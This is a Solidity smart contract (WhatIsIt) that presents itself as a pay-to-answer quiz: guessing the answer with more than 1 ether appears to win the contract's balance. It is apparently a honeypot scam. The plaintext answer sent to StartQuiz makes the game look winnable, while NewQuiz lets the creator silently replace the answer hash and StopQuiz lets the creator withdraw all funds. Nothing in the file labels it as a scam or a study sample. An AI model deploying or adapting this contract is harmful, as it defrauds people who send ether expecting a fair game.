1 pragma solidity ^0.4.20;
2 
3 contract WhatIsIt
4 {
5     bytes32 responseHash;
6     string public Question;
7     address questionSender;
8 
9     function Answer(string guess)
10     public payable {
11         if (responseHash == keccak256(guess) && msg.value>1 ether) {
12             msg.sender.transfer(this.balance);
13         }
14     }
15  
16     function StartQuiz(string question, string response)
17     public payable {
18         if (responseHash==0x0) {
19             responseHash = keccak256(response);
20             Question = question;
21             questionSender = msg.sender;
22         }
23     }
24 
25     function StopQuiz()
26     public payable {
27         if (msg.sender==questionSender) {
28             msg.sender.transfer(this.balance);
29         }
30     }
31 
32     function NewQuiz(string question, bytes32 _responseHash)
33     public payable {
34         if (msg.sender==questionSender) {
35             Question = question;
36             responseHash = _responseHash;
37         }
38     }
39 
40     function () public payable { }
41 }